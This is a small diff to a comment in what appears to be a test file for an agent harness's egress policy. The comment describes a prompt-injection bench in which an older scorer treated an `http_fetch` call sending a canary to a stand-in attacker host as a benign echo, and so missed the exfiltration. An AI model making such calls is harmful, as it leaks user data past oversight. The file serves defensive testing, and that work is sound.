@@ -404,7 +404,7 @@ def test_the_architecture_verdict_names_the_channel_and_closes_the_measurement()
 #
 # `http_fetch` and `http_search` are annotated read-only (`agent_mcp/annotations.py:82`), so
 # the pre-#2128 scorer read `http_fetch(url="http://attacker.invalid/?d=<CANARY>")` — the
-# shape `agent_mcp/egress.py:10` quotes #590's EchoLeak fixture with — as a benign echo, and
+# shape `agent_mcp/egress.py`'s module docstring quotes #590's EchoLeak fixture with — as a benign echo, and
 # the only planted-instruction bench on the box could not register the one escape
 # `harness.egress_policy` exists to stop. The six nodes below are the item's five clauses,
 # plus the branch under the arm.
